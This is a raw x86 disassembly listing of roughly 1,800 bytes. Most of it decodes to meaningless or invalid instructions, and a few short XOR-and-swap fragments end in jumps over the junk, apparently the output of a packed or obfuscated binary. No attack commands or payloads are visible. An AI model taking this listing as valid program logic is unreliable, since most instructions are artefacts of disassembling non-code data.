  40c87c:	iret   
  40c87d:	pop    edi
  40c87e:	xlat   BYTE PTR ds:[ebx]
  40c87f:	sti    
  40c880:	iret   
  40c881:	jb     0x40c8f6
  40c883:	xchg   ebx,eax
  40c884:	mov    ecx,0x18c6468
  40c889:	mov    ch,0x51
  40c88b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c88c:	outs   dx,DWORD PTR ds:[esi]
  40c88d:	and    DWORD PTR [edi],ebx
  40c88f:	(bad)
  40c893:	add    dl,bl
  40c895:	mov    cl,0x55
  40c897:	stc    
  40c898:	xor    al,BYTE PTR [esi+ecx*2]
  40c89b:	adc    al,0x31
  40c89d:	mov    ds:0xe15c2ac2,al
  40c8a2:	call   0x6a21:0x77cf2fce
  40c8a9:	dec    eax
  40c8aa:	test   al,0x99
  40c8ac:	jmp    0xe08:0x687a815e
  40c8b3:	cdq    
  40c8b4:	sbb    al,0x22
  40c8b6:	test   al,0xd
  40c8b8:	cmp    dl,cl
  40c8ba:	pop    edi
  40c8bb:	pop    ds
  40c8bc:	inc    ebp
  40c8bd:	in     al,0x1f
  40c8bf:	xchg   esp,eax
  40c8c0:	mov    ds:0xaaf04dab,eax
  40c8c5:	dec    ebx
  40c8c6:	mov    ebx,0x7226106e
  40c8cb:	enter  0x7b47,0x9b
  40c8cf:	jmp    0x4a57c40
  40c8d4:	xchg   ecx,eax
  40c8d5:	icebp  
  40c8d6:	or     al,0xc3
  40c8d8:	in     al,0x91
  40c8da:	aad    0xf5
  40c8dc:	stos   BYTE PTR es:[edi],al
  40c8dd:	push   0xd8523f
  40c8e2:	sbb    esi,edx
  40c8e4:	xchg   edx,eax
  40c8e5:	out    dx,al
  40c8e6:	and    al,0xe3
  40c8e8:	lods   al,BYTE PTR ds:[esi]
  40c8e9:	push   0xd986c6f1
  40c8ee:	ret    0xf7c
  40c8f1:	aaa    
  40c8f2:	cld    
  40c8f3:	dec    eax
  40c8f4:	nop
  40c8f5:	sub    DWORD PTR [ecx+edi*1-0x60ce7b38],ecx
  40c8fc:	(bad)  
  40c8fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8fe:	dec    eax
  40c8ff:	mov    ecx,0xd794f74a
  40c904:	push   edx
  40c905:	inc    ebx
  40c906:	scas   al,BYTE PTR es:[edi]
  40c907:	outs   dx,DWORD PTR ds:[esi]
  40c908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c909:	mov    BYTE PTR ds:0x41a34c8d,dl
  40c90f:	mov    dl,BYTE PTR [edx+0xd]
  40c912:	xchg   ecx,eax
  40c913:	imul   ebp,DWORD PTR [eax-0x44],0x10
  40c917:	jbe    0x40c8af
  40c919:	call   0xd1314ed6
  40c91e:	inc    ebx
  40c91f:	pop    edx
  40c920:	xchg   ebp,eax
  40c921:	xchg   esi,eax
  40c922:	adc    BYTE PTR cs:[ebx+0xa],0xd0
  40c927:	cmp    bl,BYTE PTR [esi+0x504de37f]
  40c92d:	xor    edx,ebx
  40c92f:	xchg   DWORD PTR [edx],esp
  40c931:	es test al,0x2c
  40c934:	pusha  
  40c935:	mov    ds:0xaf3563a2,eax
  40c93a:	(bad)  
  40c93c:	or     ebx,edi
  40c93e:	xor    al,0xc0
  40c940:	inc    ecx
  40c941:	mov    ds,WORD PTR [eax]
  40c943:	sbb    BYTE PTR [edi-0x7413aafd],0x7d
  40c94a:	in     al,0x8a
  40c94c:	xchg   esp,eax
  40c94d:	cmp    bl,BYTE PTR [ecx-0x77ffcd8e]
  40c953:	push   ebp
  40c954:	jnp    0xd074bdaf
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	psubusb mm3,QWORD PTR [ebp-0x11]
  40c9a1:	jp     0x40c96d
  40c9a3:	xchg   edx,eax
  40c9a4:	jle    0x40ca24
  40c9a6:	jo     0x40ca21
  40c9a8:	jle    0x40ca28
  40c9aa:	fild   WORD PTR [edi-0x2275510]
  40c9b0:	xor    BYTE PTR [edx],bl
  40c9b2:	pop    ebx
  40c9b3:	xor    DWORD PTR [ebx+0x44],ebx
  40c9b6:	push   ds
  40c9b7:	add    edx,eax
  40c9b9:	aas    
  40c9ba:	xchg   esi,eax
  40c9bb:	mov    ch,0x4b
  40c9bd:	das    
  40c9be:	enter  0x1c87,0xf8
  40c9c2:	pop    edi
  40c9c3:	call   FWORD PTR [edi+0x23b12bda]
  40c9c9:	(bad)  
  40c9ca:	cmp    ah,BYTE PTR [ebx]
  40c9cc:	sar    DWORD PTR [ecx+0x39],1
  40c9cf:	int    0xdb
  40c9d1:	mov    bl,0xb3
  40c9d3:	retf   0xed8a
  40c9d6:	shl    DWORD PTR [edi-0x4a98f72a],0x41
  40c9dd:	shr    BYTE PTR [ebx-0x4dd3f970],1
  40c9e3:	pop    esp
  40c9e4:	(bad)  
  40c9e5:	sbb    edi,DWORD PTR [ebp+eax*8+0x6d]
  40c9e9:	fsub   QWORD PTR [ebx+ebp*4-0x20]
  40c9ed:	adc    cl,BYTE PTR [esi]
  40c9ef:	out    0x48,al
  40c9f1:	je     0x40c9c6
  40c9f3:	jb     0x40c9fb
  40c9f5:	bound  esi,QWORD PTR [edx+0x77b32a4a]
  40c9fb:	add    eax,0x594c89f4
  40ca00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca01:	mov    esp,0x7c5126e9
  40ca06:	push   es
  40ca07:	std    
  40ca08:	mov    ch,BYTE PTR [ebp+0x31c4c810]
  40ca0e:	jne    0x40ca47
  40ca10:	or     ecx,DWORD PTR [esi]
  40ca12:	imul   eax,ebx,0xffffff99
  40ca15:	scas   eax,DWORD PTR es:[edi]
  40ca16:	mov    dl,0x80
  40ca18:	jp     0x40ca25
  40ca1a:	xlat   BYTE PTR ds:[ebx]
  40ca1b:	push   cs
  40ca1c:	pop    ebx
  40ca1d:	std    
  40ca1e:	adc    bh,bl
  40ca20:	lods   eax,DWORD PTR ds:[esi]
  40ca21:	cdq    
  40ca22:	leave  
  40ca23:	cli    
  40ca24:	xchg   ecx,eax
  40ca25:	xor    eax,0xe3553ae
  40ca2a:	push   0x2a42c325
  40ca2f:	xchg   DWORD PTR [esi+0x33],esp
  40ca32:	sbb    BYTE PTR [ebx+0x6d5ae0d4],dh
  40ca38:	mov    ds:0xc1bda653,al
  40ca3d:	push   ebx
  40ca3e:	dec    ebp
  40ca3f:	inc    ebx
  40ca40:	sbb    al,0x29
  40ca42:	push   ebp
  40ca43:	sub    esp,ecx
  40ca45:	push   cs
  40ca46:	xchg   esi,eax
  40ca47:	sub    al,0x49
  40ca49:	pop    esp
  40ca4a:	jnp    0x40c9f8
  40ca4c:	xor    eax,0xbea8981f
  40ca51:	and    DWORD PTR [ebp-0x106e627],eax
  40ca57:	xchg   esi,eax
  40ca58:	lods   eax,DWORD PTR ds:[esi]
  40ca59:	jae    0x40ca56
  40ca5b:	retf   
  40ca5c:	mov    ah,0xcd
  40ca5e:	cwde   
  40ca5f:	scas   eax,DWORD PTR es:[edi]
  40ca60:	cld    
  40ca61:	scas   al,BYTE PTR es:[edi]
  40ca62:	dec    ecx
  40ca63:	arpl   WORD PTR [eax+0x3d12a21c],sp
  40ca69:	repnz xchg edx,eax
  40ca6b:	js     0x40c9f0
  40ca6d:	fisttp DWORD PTR [eax+0x1637dadd]
  40ca73:	pop    edi
  40ca74:	pushf  
  40ca75:	mov    ebp,0x490d08ab
  40ca7a:	fadd   DWORD PTR [edi+edx*2]
  40ca7d:	and    bl,ch
  40ca7f:	pusha  
  40ca80:	popf   
  40ca81:	in     eax,dx
  40ca82:	into   
  40ca83:	xor    al,0x8c
  40ca85:	jae    0x40caf1
  40ca87:	mov    edx,DWORD PTR [ebp+0x7b]
  40ca8a:	call   eax
  40ca8c:	or     BYTE PTR [ecx+0x2a],dh
  40ca8f:	mov    BYTE PTR [esi-0x1766c2de],bh
  40ca95:	mov    eax,ds:0x852439d
  40ca9a:	mov    ds:0xf39b150d,al
  40ca9f:	sub    al,0x43
  40caa1:	pop    edx
  40caa2:	(bad)  
  40caa3:	adc    ebp,DWORD PTR [edi]
  40caa5:	adc    eax,0xdec50b20
  40caaa:	loopne 0x40cb28
  40caac:	and    al,dh
  40caae:	dec    ebx
  40caaf:	aam    0x37
  40cab1:	jns    0x40cb2b
  40cab3:	sti    
  40cab4:	data16 int3 
  40cab6:	and    al,0x51
  40cab8:	push   esp
  40cab9:	enter  0x3545,0xb4
  40cabd:	out    0x5,eax
  40cabf:	dec    esi
  40cac0:	pop    edi
  40cac1:	test   BYTE PTR [ebp-0x61e2d814],ch
  40cac7:	out    0xc1,eax
  40cac9:	inc    esi
  40caca:	scas   eax,DWORD PTR es:[edi]
  40cacb:	xor    esi,DWORD PTR [esi+0x6d]
  40cace:	add    ch,al
  40cad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cad1:	dec    ecx
  40cad2:	inc    ebx
  40cad3:	xor    al,0x7
  40cad5:	outs   dx,DWORD PTR ds:[esi]
  40cad6:	cmp    BYTE PTR [ecx],ch
  40cad8:	mov    ebp,0xa0ddcb06
  40cadd:	in     eax,0xd5
  40cadf:	sar    DWORD PTR [ebx-0x2f3a0a9d],1
  40cae5:	shl    DWORD PTR [eax],1
  40cae7:	dec    eax
  40cae8:	scas   eax,DWORD PTR es:[edi]
  40cae9:	jne    0x40cada
  40caeb:	dec    ebp
  40caec:	fsub   QWORD PTR ds:0x50852ea5
  40caf2:	inc    ebx
  40caf3:	repz inc eax
  40caf5:	mov    edx,0x6d35661d
  40cafa:	push   edx
  40cafb:	ss into 
  40cafd:	shl    DWORD PTR [ebx+0x4d7f5d2c],1
  40cb03:	pushf  
  40cb04:	ins    BYTE PTR es:[edi],dx
  40cb05:	and    edi,edx
  40cb07:	arpl   WORD PTR [edi-0x51a67da],si
  40cb0d:	pop    eax
  40cb0e:	into   
  40cb0f:	mov    cl,0x5c
  40cb11:	rol    DWORD PTR [ebx],1
  40cb13:	bound  ecx,QWORD PTR [esi]
  40cb15:	cmp    ebp,ebx
  40cb17:	push   edx
  40cb18:	sub    eax,0xce95b047
  40cb1d:	iret   
  40cb1e:	test   al,0xd6
  40cb20:	inc    DWORD PTR [edx+0x17]
  40cb23:	mov    ds:0xc6101cae,al
  40cb28:	cld    
  40cb29:	js     0x40cb89
  40cb2b:	mov    al,ds:0x12edee7
  40cb30:	jnp    0x40cb02
  40cb32:	ja     0x40cb6e
  40cb34:	xor    BYTE PTR [ebx-0x4f6786d1],0xf6
  40cb3b:	and    eax,0xf25b49d8
  40cb40:	dec    esi
  40cb41:	int    0x37
  40cb43:	adc    DWORD PTR [edi-0x448afe91],ecx
  40cb49:	push   0xffffff98
  40cb4b:	inc    ecx
  40cb4c:	pushf  
  40cb4d:	lds    ecx,FWORD PTR [ebp+0x5a]
  40cb50:	jge    0x40cb94
  40cb52:	mov    al,0x8d
  40cb54:	cmp    DWORD PTR fs:[esi+0x6efa0583],edi
  40cb5b:	sub    eax,0xe1ba074c
  40cb60:	das    
  40cb61:	sar    dl,cl
  40cb63:	int    0x85
  40cb65:	sub    cl,BYTE PTR [edi-0x32149612]
  40cb6b:	popa   
  40cb6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb6d:	push   edi
  40cb6e:	inc    ebx
  40cb6f:	(bad)  
  40cb70:	jb     0x40cb22
  40cb72:	call   0x7a3022fa
  40cb77:	shl    BYTE PTR [eax+0x6b0d6e11],cl
  40cb7d:	jbe    0x40cbfd
  40cb7f:	addr16 aam 0x32
  40cb82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb83:	sub    BYTE PTR [ecx+0x1e],al
  40cb86:	ret    
  40cb87:	(bad)  
  40cb88:	and    DWORD PTR [esi+0x57582ffc],ecx
  40cb8e:	mov    edi,0x116d9dc9
  40cb93:	jne    0x40cbf1
  40cb95:	sub    dl,BYTE PTR [esp+edi*8]
  40cb98:	push   ebp
  40cb99:	(bad)  
  40cb9a:	hlt    
  40cb9b:	dec    edi
  40cb9c:	xchg   ah,ch
  40cb9e:	adc    eax,0xfed46afb
  40cba3:	inc    edx
  40cba4:	shl    ebx,0xb9
  40cba7:	ins    BYTE PTR es:[edi],dx
  40cba8:	(bad)  
  40cba9:	fisttp QWORD PTR [esi-0x48]
  40cbac:	pop    DWORD PTR [edx-0x5e]
  40cbaf:	ds add al,0xbb
  40cbb2:	push   esi
  40cbb3:	retf   0x21d2
  40cbb6:	mov    dh,0x5d
  40cbb8:	repnz fisubr DWORD PTR [ecx]
  40cbbb:	adc    dl,BYTE PTR [edi]
  40cbbd:	inc    ebp
  40cbbe:	sub    DWORD PTR [ecx-0x50976fa8],esi
  40cbc4:	jbe    0x40cb9e
  40cbc6:	ret    0xadd0
  40cbc9:	mov    DWORD PTR [ebp+ebp*4-0x6e],esp
  40cbcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbce:	jmp    0x70388088
  40cbd3:	call   0xdb8a:0x8bc072b4
  40cbda:	jle    0x40cc3c
  40cbdc:	stos   DWORD PTR es:[edi],eax
  40cbdd:	inc    ebx
  40cbde:	inc    ebx
  40cbdf:	jne    0x40cc43
  40cbe1:	outs   dx,DWORD PTR ds:[esi]
  40cbe2:	iret   
  40cbe3:	pop    es
  40cbe4:	xor    ebp,DWORD PTR [ebx+0x58666ae6]
  40cbea:	loope  0x40cbbc
  40cbec:	hlt    
  40cbed:	mov    ah,0x32
  40cbef:	out    0x17,eax
  40cbf1:	(bad)  
  40cbf3:	pop    ecx
  40cbf4:	xor    DWORD PTR [eax+esi*1-0x6f49c8cf],esi
  40cbfb:	dec    esi
  40cbfc:	push   edi
  40cbfd:	sub    DWORD PTR [esi+0x3a],edx
  40cc00:	jl     0x40cba1
  40cc02:	daa    
  40cc03:	sub    eax,0xb9cd2ba4
  40cc08:	mov    dl,0x7d
  40cc0a:	dec    ebp
  40cc0b:	sub    ebx,DWORD PTR [eax+0x1a]
  40cc0e:	aaa    
  40cc0f:	push   cs
  40cc10:	add    DWORD PTR es:[esi+0xc],0x33
  40cc15:	in     al,dx
  40cc16:	clc    
  40cc17:	mov    ecx,0x86a8f551
  40cc1c:	test   DWORD PTR [edx+0x4c],edi
  40cc1f:	jle    0x40cc7e
  40cc21:	retf   
  40cc22:	mov    ch,0x7f
  40cc24:	pop    eax
  40cc25:	fidivr WORD PTR [edx+0x513730bc]
  40cc2b:	adc    al,0x96
  40cc2d:	xor    ecx,DWORD PTR [eax-0x6c]
  40cc30:	xchg   BYTE PTR [eax],dl
  40cc32:	sbb    DWORD PTR [esi],esi
  40cc34:	pop    ebp
  40cc35:	xchg   ebp,eax
  40cc36:	pushf  
  40cc37:	in     al,0x9d
  40cc39:	jno    0x40cc2c
  40cc3b:	imul   esi,DWORD PTR [esi+0x6d0bbdd7],0xd797ad3c
  40cc45:	enter  0xaafd,0x5e
  40cc49:	adc    esp,DWORD PTR [edi]
  40cc4b:	inc    edx
  40cc4c:	or     ch,BYTE PTR [ebx+edx*1]
  40cc4f:	fdiv   DWORD PTR [edi+0x48]
  40cc52:	outs   dx,BYTE PTR ds:[esi]
  40cc53:	mov    ebx,0x8968e6dc
  40cc58:	aas    
  40cc59:	jl     0x40cbea
  40cc5b:	mov    bh,0x41
  40cc5d:	cmc    
  40cc5e:	jno    0x40cc0b
  40cc60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc61:	dec    esi
  40cc62:	sbb    DWORD PTR [ebp+0x48],0xc
  40cc66:	add    ch,BYTE PTR [ebx-0x1ab9ffc2]
  40cc6c:	jmp    0x46fc:0xd432db11
  40cc73:	lahf   
  40cc74:	and    eax,0x9d67bd12
  40cc79:	fcomp  QWORD PTR [ecx]
  40cc7b:	cmp    ebp,esp
  40cc7d:	mov    ebx,0xfdb2f824
  40cc82:	pop    ds
  40cc83:	or     cl,BYTE PTR [ebp+0x7a]
  40cc86:	(bad)  
  40cc87:	jo     0x40cc92
  40cc89:	xor    ebp,0x12d6a301
  40cc8f:	cmp    eax,0xad74dbfc
  40cc94:	aaa    
  40cc95:	(bad)  
  40cc96:	out    dx,eax
  40cc97:	mov    dh,0xaf
  40cc99:	dec    esp
  40cc9a:	ret    
  40cc9b:	push   esi
  40cc9c:	jb     0x40cc95
  40cc9e:	icebp  
  40cc9f:	ja     0x40cd0a
  40cca1:	scas   al,BYTE PTR es:[edi]
  40cca2:	pop    ecx
  40cca3:	jae    0x40cc65
  40cca5:	adc    cl,BYTE PTR [eax]
  40cca7:	retf   
  40cca8:	fidivr WORD PTR [edx]
  40ccaa:	sbb    DWORD PTR [edi],esi
  40ccac:	mov    eax,0x27e5b9aa
  40ccb1:	mov    dl,0xb2
  40ccb3:	(bad)  
  40ccb4:	cmp    bl,BYTE PTR [edx-0x6a6d5a11]
  40ccba:	mov    edx,DWORD PTR [ebp+0x29]
  40ccbd:	(bad)  
  40ccbf:	sbb    bl,BYTE PTR [ebp+edx*4+0x4e]
  40ccc3:	rcl    edx,1
  40ccc5:	ficom  DWORD PTR [ebx]
  40ccc7:	jae    0x40ccfe
  40ccc9:	cli    
  40ccca:	(bad)  
  40cccb:	fucomp st(0)
  40cccd:	add    eax,0x55db3e0b
  40ccd2:	adc    eax,0x90b0fe23
  40ccd7:	pusha  
  40ccd8:	cmp    al,0xdc
  40ccda:	pop    es
  40ccdb:	pusha  
  40ccdc:	inc    edi
  40ccdd:	shr    DWORD PTR [ecx+0x5871e540],cl
  40cce3:	xchg   DWORD PTR [esi+ebp*1],ebx
  40cce6:	std    
  40cce7:	scas   al,BYTE PTR es:[edi]
  40cce8:	and    BYTE PTR [ebp-0x26],cl
  40cceb:	ficomp WORD PTR [ecx+0x2a5f2db5]
  40ccf1:	int    0x61
  40ccf3:	arpl   WORD PTR [eax],cx
  40ccf5:	mov    DWORD PTR [esi+edx*8-0x57971210],ebp
  40ccfc:	lds    edi,FWORD PTR [eax+ecx*1]
  40ccff:	fist   WORD PTR [esi+0x351e3362]
  40cd05:	pop    edx
  40cd06:	pop    es
  40cd07:	fs in  al,dx
  40cd09:	sub    eax,0x5075ad95
  40cd0e:	xchg   ebx,eax
  40cd0f:	adc    esi,esp
  40cd11:	push   ecx
  40cd12:	and    eax,0x64866147
  40cd17:	pop    ebx
  40cd18:	push   esp
  40cd19:	xlat   BYTE PTR ds:[ebx]
  40cd1a:	cs imul edi,eax,0x7599867a
  40cd21:	mov    bh,0x3b
  40cd23:	xor    DWORD PTR [eax+0x7812e52d],esp
  40cd29:	inc    esi
  40cd2a:	repnz sub esp,DWORD PTR [ebp+0x34a15d67]
  40cd31:	cmp    ah,BYTE PTR [edi+eax*2]
  40cd34:	std    
  40cd35:	pop    esi
  40cd36:	popf   
  40cd37:	(bad)  
  40cd38:	or     eax,0xb8bcde0f
  40cd3d:	aas    
  40cd3e:	adc    dh,dh
  40cd40:	adc    eax,0x9fe4c39
  40cd45:	cmp    bh,ah
  40cd47:	sub    esi,ebx
  40cd49:	sub    BYTE PTR [ebx+0x3c],0x6c
  40cd4d:	ja     0x40cd16
  40cd4f:	(bad)  
  40cd52:	test   BYTE PTR [esi],ch
  40cd54:	mov    ebp,0x47028d48
  40cd59:	and    DWORD PTR ds:[esi+ecx*1-0x53],esi
  40cd5e:	pushf  
  40cd5f:	mov    edx,0x9343da3
  40cd64:	sar    BYTE PTR [ecx+eiz*2+0x64],1
  40cd68:	in     eax,dx
  40cd69:	xchg   DWORD PTR [eax-0x20],ecx
  40cd6c:	imul   edx,DWORD PTR [eax-0x4b],0xffffffb5
  40cd70:	jo     0x40cd64
  40cd72:	addr16 test eax,0xcf878f3a
  40cd78:	adc    al,0xbc
  40cd7a:	mov    cl,0x69
  40cd7c:	test   al,0xcb
  40cd7e:	xchg   ebx,eax
  40cd7f:	neg    BYTE PTR [eax+0x7c]
  40cd82:	push   es
  40cd83:	pop    edi
  40cd84:	test   DWORD PTR [ecx],eax
  40cd86:	jb     0x40cde3
  40cd88:	sub    bh,bh
  40cd8a:	(bad)  
  40cd8c:	in     al,dx
  40cd8d:	cmp    DWORD PTR [esi-0x29fb16c4],esi
  40cd93:	sbb    eax,0xf99a79f
  40cd98:	dec    ebp
  40cd99:	xor    edx,DWORD PTR [eax]
  40cd9b:	xor    BYTE PTR [ebx+0x37ca1511],bl
  40cda1:	mov    al,BYTE PTR [ecx]
  40cda3:	cmp    cl,BYTE PTR [eax+0x72991f94]
  40cda9:	xor    al,BYTE PTR [eax]
  40cdab:	mov    edx,DWORD PTR [ebp-0x44]
  40cdae:	mov    edi,DWORD PTR [ebp-0xc]
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	ret    0x5758
  40cddc:	mov    dh,0xcc
  40cdde:	sahf   
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	push   ebp
  40cde6:	in     eax,0xb9
  40cde8:	and    edi,DWORD PTR [ecx+ebx*8]
  40cdeb:	outs   dx,BYTE PTR ds:[esi]
  40cdec:	push   cs
  40cded:	loopne 0x40ce50
  40cdef:	xchg   ebp,eax
  40cdf0:	cmp    al,0xb1
  40cdf2:	das    
  40cdf3:	pop    edx
  40cdf4:	mov    eax,0x18685fb5
  40cdfa:	rcr    bl,1
  40cdfc:	int    0xf5
  40cdfe:	inc    ebx
  40cdff:	sbb    eax,ecx
  40ce01:	addr16 sub al,0x73
  40ce04:	ss mov ebp,ds
  40ce07:	clc    
  40ce08:	aaa    
  40ce09:	adc    al,BYTE PTR [esi-0x4dd8ef8b]
  40ce0f:	jg     0x40ce48
  40ce11:	aam    0xe3
  40ce13:	(bad)  
  40ce15:	dec    esp
  40ce16:	nop
  40ce17:	adc    dh,BYTE PTR [eax+0x56a56eeb]
  40ce1d:	in     al,dx
  40ce1e:	enter  0x22aa,0x85
  40ce22:	lock cmc 
  40ce24:	and    dh,BYTE PTR [ebx+0x71]
  40ce27:	inc    ebx
  40ce28:	dec    DWORD PTR [ebx]
  40ce2a:	lods   eax,DWORD PTR ds:[esi]
  40ce2b:	call   0xbbeeff69
  40ce30:	jg     0x40cdc4
  40ce32:	int    0xa
  40ce34:	xor    eax,0xa0f467c7
  40ce39:	push   ds
  40ce3a:	dec    esi
  40ce3b:	repnz xchg edx,eax
  40ce3d:	ficom  WORD PTR [ecx+0x5142d39f]
  40ce43:	adc    al,0x9e
  40ce45:	and    BYTE PTR [ebx],dl
  40ce47:	xchg   edx,eax
  40ce48:	mov    esp,0x27f020da
  40ce4d:	dec    esi
  40ce4e:	into   
  40ce4f:	in     eax,0x19
  40ce51:	ins    BYTE PTR es:[edi],dx
  40ce52:	imul   edi,DWORD PTR [edx-0x62d3a063],0x8266d64a
  40ce5c:	sub    BYTE PTR [ebx],0x7f
  40ce5f:	imul   eax,esi,0x46ce432c
  40ce65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce66:	clc    
  40ce67:	xchg   edi,eax
  40ce68:	sahf   
  40ce69:	xchg   edi,eax
  40ce6a:	inc    edx
  40ce6b:	bound  eax,QWORD PTR [ebx-0x6f3c675a]
  40ce71:	clc    
  40ce72:	jl     0x40ce6c
  40ce74:	mov    al,ds:0x79069dcf
  40ce79:	gs pop ds
  40ce7b:	xchg   DWORD PTR [eax+eax*8+0x7a],ebx
  40ce7f:	push   ebx
  40ce80:	fbld   TBYTE PTR [esi-0x767f691c]
  40ce86:	xchg   ecx,eax
  40ce87:	mov    al,fs:0x668403d3
  40ce8d:	pop    eax
  40ce8e:	fild   QWORD PTR [ecx]
  40ce90:	(bad)  
  40ce91:	gs dec edx
  40ce93:	and    dh,BYTE PTR [esi+0x76]
  40ce96:	aad    0xb6
  40ce98:	js     0x40ce71
  40ce9a:	(bad)  
  40ce9b:	or     al,0x84
  40ce9d:	lods   al,BYTE PTR ds:[si]
  40cea0:	sub    al,0x3
  40cea2:	ins    BYTE PTR es:[edi],dx
  40cea3:	loope  0x40ce5e
  40cea5:	call   0x80ba:0xac20a94f
  40ceac:	add    DWORD PTR [eax+ecx*2],edi
  40ceaf:	shl    DWORD PTR [ecx+0x6a],cl
  40ceb2:	wrmsr  
  40ceb4:	and    al,0xfd
  40ceb6:	test   eax,0xb6ecd4eb
  40cebb:	dec    ebx
  40cebc:	mov    eax,es
  40cebe:	dec    esp
  40cebf:	into   
  40cec0:	daa    
  40cec1:	std    
  40cec2:	out    dx,eax
  40cec3:	add    DWORD PTR [edi],ecx
  40cec5:	cwde   
  40cec6:	xor    al,0x2a
  40cec8:	xchg   edx,eax
  40cec9:	call   0x8808387c
  40cece:	shl    BYTE PTR [edi],0xe3
  40ced1:	in     al,0x77
  40ced3:	fld    DWORD PTR [ebx]
  40ced5:	aad    0xa7
  40ced7:	ficom  DWORD PTR ds:0xca8e3ac
  40cedd:	xor    eax,0x163606d7
  40cee2:	ror    BYTE PTR fs:[eax+0x40],1
  40cee6:	loope  0x40ce97
  40cee8:	cmp    BYTE PTR [ebx+edi*2-0x2b],dh
  40ceec:	dec    eax
  40ceed:	scas   al,BYTE PTR es:[edi]
  40ceee:	mov    ds:0x5d0d95d3,al
  40cef3:	inc    esi
  40cef4:	fidivr WORD PTR [edx+0x72]
  40cef7:	(bad)  
  40cef9:	push   ebx
  40cefa:	mov    eax,ds:0x9e7d3f21
  40cf00:	loopne 0x40cf47
  40cf02:	fndisi(8087 only) 
  40cf04:	jmp    0xc431:0xc2e08046
  40cf0b:	mov    al,ds:0x901f7216
  40cf10:	loop   0x40cf17
  40cf12:	ins    DWORD PTR es:[edi],dx
  40cf13:	push   es
  40cf14:	jbe    0x40cf80
  40cf16:	xchg   esi,eax
  40cf17:	popa   
  40cf18:	call   DWORD PTR [esi]
  40cf1a:	pop    ebx
  40cf1b:	iret   
  40cf1c:	aam    0x20
  40cf1e:	sub    DWORD PTR [ebp+0x8],0xffffffda
  40cf22:	std    
  40cf23:	jmp    0x9546:0xbfb6ca6c
  40cf2a:	fdivr  st,st(4)
  40cf2c:	outs   dx,DWORD PTR ds:[esi]
  40cf2d:	add    al,0xd3
  40cf2f:	add    BYTE PTR [eax+0x6a44af5f],bh
  40cf35:	out    dx,al
  40cf36:	into   
  40cf37:	and    DWORD PTR [esi-0x9],ecx
  40cf3a:	out    0xd0,al
  40cf3c:	lods   eax,DWORD PTR ds:[esi]
  40cf3d:	push   edx
  40cf3e:	stc    
  40cf3f:	in     al,dx
  40cf40:	and    BYTE PTR [ebp+0x44c96fb1],bl
  40cf46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf47:	push   0x6eb39543
  40cf4c:	ror    BYTE PTR ss:[edi],cl
  40cf4f:	xor    ch,ah
  40cf51:	fidiv  DWORD PTR [edx+0x7a]
  40cf54:	sub    al,0xbc
  40cf56:	inc    eax
  40cf57:	pop    esp
  40cf58:	pop    eax
  40cf59:	loop   0x40cf34
  40cf5b:	mov    esp,0x47492b55
  40cf60:	sub    BYTE PTR [ebp+0x86d4267],bl
  40cf66:	add    eax,0xeef8780d
  40cf6b:	cwde   
  40cf6c:	push   ss
  40cf6d:	and    eax,0x23f72d3f
  40cf72:	sbb    eax,0x10cb230f
  40cf77:	stc    
  40cf78:	mov    ch,0x30
  40cf7a:	add    ch,cl
  40cf7c:	in     al,dx
  40cf7d:	dec    eax
  40cf7e:	add    eax,0x42cbbde4
  40cf83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf84:	push   esp
  40cf85:	xor    BYTE PTR [ebp+ebp*1+0x28c719b1],bl
  40cf8c:	scas   eax,DWORD PTR es:[edi]
  40cf8d:	xlat   BYTE PTR ds:[ebx]
  40cf8e:	(bad)  
  40cf8f:	jno    0x40cf72
  40cf91:	push   es
  40cf92:	push   esp
  40cf93:	out    0x66,eax
  40cf95:	jns    0x40cfb4
  40cf97:	loope  0x40cfa0
  40cf99:	(bad)  
  40cf9b:	pop    DWORD PTR [edx+ecx*2]
  40cf9e:	shl    DWORD PTR [eax+edi*8-0x3cbc0185],1
  40cfa5:	rol    BYTE PTR [esi-0x51],1
